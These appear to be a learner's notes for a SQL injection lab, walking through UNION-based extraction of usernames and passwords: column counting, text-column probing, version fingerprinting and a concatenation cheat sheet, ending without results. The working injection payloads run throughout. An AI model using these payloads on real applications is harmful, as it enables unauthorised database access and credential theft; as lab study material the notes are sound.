Retrieving multiple values within a single column

In the preceding example, suppose instead that the query only returns a single column.

You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

' UNION SELECT username || '~' || password FROM users--
This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.

The results from the query will let you read all of the usernames and passwords, for example:

...
administrator~s3cure
wiener~peter
carlos~montoya
...
Note that different databases use different syntax to perform string concatenation.


find the number of columns,

' order by 1 --
' order by 2 --
' order by 3 --

there are 2 columns

find the column with text
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--

column 2 has text values

retrieve data from the tbles

USERNAMES :
' UNION SELECT NULL, username FROM users-- 
this gets the usernames

Passwords
' UNION SELECT NULL, password FROM users--

combine the two querries

String concatenation
You can concatenate together multiple strings to make a single string.
Oracle	'foo'||'bar'
Microsoft	'foo'+'bar'
PostgreSQL	'foo'||'bar'
MySQL	'foo' 'bar' [Note the space between the two strings]
CONCAT('foo','bar')

get the database version
You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

Oracle	SELECT banner FROM v$version
SELECT version FROM v$instance
Microsoft	SELECT @@version
PostgreSQL	SELECT version()
MySQL	SELECT @@version

payload - 
' UNION SELECT NULL, @@version FROM users-- 
' UNION SELECT NULL, version() FROM users--
the db is postgress - 
PostgreSQL 12.13 (Ubuntu 12.13-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit

now that we have db version we can concatinate the string to output both username and passwords
' UNION SELECT NULL, username || password FROM users--
include separator to know where username ends and password starts
' UNION SELECT NULL, username || '*' || password FROM users--
results of the querry -
